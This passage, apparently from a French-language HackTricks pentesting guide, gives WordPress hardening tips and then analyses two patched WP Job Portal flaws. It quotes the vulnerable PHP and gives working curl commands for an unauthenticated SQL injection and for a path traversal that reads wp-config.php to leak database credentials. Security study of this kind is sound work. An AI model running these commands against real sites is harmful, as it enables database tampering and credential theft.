- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur par d√©faut **admin**
- Utilisez des **mots de passe forts** et la **2FA**
- V√©rifiez p√©riodiquement les **autorisations** des utilisateurs
- **Limitez les tentatives de connexion** pour pr√©venir les attaques par Brute Force
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'acc√®s qu'en interne ou depuis certaines adresses IP.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal exposait une t√¢che **savecategory** qui ex√©cute finalement le code vuln√©rable suivant dans `modules/category/model.php::validateFormData()` :
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probl√®mes introduits par cet extrait :

1. **Entr√©e utilisateur non assainie** ‚Äì `parentid` provient directement de la requ√™te HTTP.
2. **Concat√©nation de cha√Ænes dans la clause WHERE** ‚Äì pas de `is_numeric()` / `esc_sql()` / requ√™te pr√©par√©e.
3. **Acc√®s non authentifi√©** ‚Äì bien que l'action soit ex√©cut√©e via `admin-post.php`, la seule v√©rification en place est un **CSRF nonce** (`wp_verify_nonce()`), que n'importe quel visiteur peut r√©cup√©rer depuis une page publique int√©grant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. R√©cup√©rer un nonce r√©cent :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter du SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La r√©ponse divulgue le r√©sultat de la requ√™te inject√©e ou modifie la base de donn√©es, prouvant une SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Une autre t√¢che, **downloadcustomfile**, permettait aux visiteurs de t√©l√©charger **n'importe quel fichier sur le disque** via path traversal. Le sink vuln√©rable se trouve dans `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contr√¥l√© par l'attaquant et concat√©n√© **sans sanitisation**. Encore une fois, la seule barri√®re est un **CSRF nonce** qui peut √™tre r√©cup√©r√© depuis la page de CV.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur renvoie le contenu de `wp-config.php`, leaking DB credentials and auth keys.

## R√©f√©rences

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
